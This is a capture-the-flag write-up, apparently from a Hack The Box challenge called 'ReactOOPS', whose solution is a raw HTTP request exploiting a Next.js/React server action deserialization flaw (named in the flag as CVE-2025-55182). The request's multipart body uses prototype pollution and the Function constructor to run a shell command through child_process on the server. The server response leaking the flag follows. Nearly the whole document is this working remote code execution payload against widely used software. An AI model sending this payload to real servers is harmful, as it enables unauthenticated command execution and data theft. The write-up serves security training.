
# ReactOOPS

NexusAI's polished assistant interface promises adaptive learning and seamless interaction. But beneath its reactive front end, subtle glitches hint that user input may be shaping the system in unexpected ways. Explore the platform, trace the echoes in its reactive layer, and uncover the hidden flaw buried behind the UI.

# Solve

```
POST / HTTP/1.1
Host:  localhost:59607
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 755

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('cat /app/flag.txt',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--



HTTP/1.1 500 Internal Server Error
Vary: rsc, next-router-state-tree, next-router-prefetch, next-router-segment-prefetch, Accept-Encoding
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
x-nextjs-cache: HIT
x-nextjs-prerender: 1
Content-Type: text/x-component
Date: Thu, 11 Dec 2025 00:50:46 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 163

0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}"}



HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}

```